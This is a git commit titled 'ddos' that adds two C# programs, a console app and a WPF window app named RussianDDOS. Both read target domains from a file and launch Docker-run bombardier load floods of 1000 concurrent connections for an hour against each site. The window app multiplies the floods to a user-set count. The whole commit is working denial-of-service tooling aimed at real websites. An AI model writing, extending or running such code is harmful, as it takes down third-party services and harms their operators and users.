b1c6ebc7fc68e5054b1d722cdc7e0a9290ac64b0
kallDun <igorxlonline24@gmail.com>
2022-02-26 16:03:34 +0200

    ddos

---
+++ RussianDDOS/Program.cs
@@ -0,0 +1,53 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+
+namespace RussianDDOS
+{
+    class Program
+    {
+        static void Main(string[] args)         
+        {             
+            string[] list = File.ReadLines("domains.txt").ToArray();
+            /*foreach (var item in list)
+            {
+                for (int i = 0; i < 2; i++)
+                {
+                    string command = $"docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{item}";
+                    *//*Process process = new Process();
+                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    {
+                        WindowStyle = ProcessWindowStyle.Maximized,
+                        FileName = "cmd.exe",
+                        Arguments = result,
+                        Verb = "runas"
+                    };
+                    process.StartInfo = startInfo;
+                    process.Start();*//*
+                    Process.Start("cmd.exe", command);
+                }
+            }*/
+
+
+            string command = $"/C docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{list[0]}";
+            Process process = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                WindowStyle = ProcessWindowStyle.Maximized,
+                FileName = "cmd.exe",
+                Arguments = command,
+                Verb = "runas"
+            };
+            process.StartInfo = startInfo;
+            process.Start();
+
+            AppDomain.CurrentDomain.ProcessExit += (s, e) =>
+            {
+                Console.WriteLine("aa");
+                process.Dispose();
+            };
+            //Process.Start("cmd.exe", $"/C docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{list[0]}");
+        }
+    }
+}
---
+++ RussianDDOSWindow/MainWindow.xaml.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows;
+
+namespace RussianDDOSWindow
+{
+    public partial class MainWindow : Window
+    {
+        readonly string[] list;
+        List<Process> processes = new List<Process>();
+
+        public MainWindow()
+        {
+            InitializeComponent();
+            list = File.ReadLines("domains.txt").ToArray();
+        }
+
+        private async void Start_Button_Click(object sender, RoutedEventArgs e)
+        {
+            try
+            {
+                var count = int.Parse(DDOS_Count_TextBox.Text);
+                MainProgressBar.Maximum = count;
+
+                for (int i = 0, j = 0; i < count; i++, j++)
+                {
+                    if (j >= list.Length) j = 0;
+                    var process = await StartProcess(list[j]);
+                    processes.Add(process);
+                    MainProgressBar.Value = processes.Count;
+                }
+            }
+            catch (Exception err)
+            {
+                MessageBox.Show($"Some error occured: {err}");
+            }
+        }
+
+        private async Task<Process> StartProcess(string domain)
+        {
+            string command = $"/C docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{domain}";
+            Process process = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                WindowStyle = ProcessWindowStyle.Minimized,
+                FileName = "cmd.exe",
+                Arguments = command
+            };
+            process.StartInfo = startInfo;
+            await Task.Run(() => process.Start());
+            return process;
+        }
+
+        private async void Stop_Button_Click(object sender, RoutedEventArgs e)
+        {
+            for (int i = processes.Count - 1; i >= 0; i--)
+            {
+                await Task.Run(() => processes[i].CloseMainWindow());
+                MainProgressBar.Value = i;
+                processes.Remove(processes[i]);
+            }
+        }
+        private void Window_Closed(object sender, EventArgs e) => Stop_Button_Click(null, null);
+    }
+}
